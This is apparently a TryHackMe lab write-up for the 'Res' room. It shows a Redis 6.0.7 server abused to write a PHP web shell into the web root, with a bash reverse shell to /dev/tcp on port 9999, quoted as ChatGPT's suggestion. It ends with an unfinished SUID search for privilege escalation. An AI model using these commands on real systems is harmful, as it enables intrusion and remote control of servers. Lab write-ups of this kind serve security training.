# Res

**Platform:** TryHackMe
**Difficulty:** Easy  
**OS:** Linux
**Category:** Database
**Date Completed:** 28-Apr-2026  

---

### Nmap Scan
`nmap -sV 10.48.131.35`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
6379/tcp open  redis   Redis key-value store 6.0.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
A `Redis 6.0.7' DBMS system is installed on port `6379`.

I start by connecting to the DBMS system using [redis-cli](#https://redis.io/docs/latest/develop/tools/cli/#host-port-password-and-database).

`redis-cli -h 10.48.131.35 -p 6379`

Now with access to redis-cli, I use chatgpt to help me.

According to ChatGPT
```
### 2. **Writing arbitrary files (dangerous feature)**

Redis can write its database to disk. If misused:

CONFIG SET dir /var/www/html  
CONFIG SET dbfilename shell.php  
SET x SET x "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/192.168.169.198/9999 0>&1'\"); ?>"
SAVE
```

I then start a netcat listener, `nc -vlnp 9999` and access the site `http://10.48.131.35/shell.php`

![502](attachments/Pasted%20image%2020260427140647.png)

searching around, I found a user.txt flag inn `home/vianka`.

I start to PrivEsc, I run `find / -type f -perm -04000 -ls 2>/dev/null` to find binaries with SUID bit set.

**I could not find a vector as xxd was not present in my machine**


# References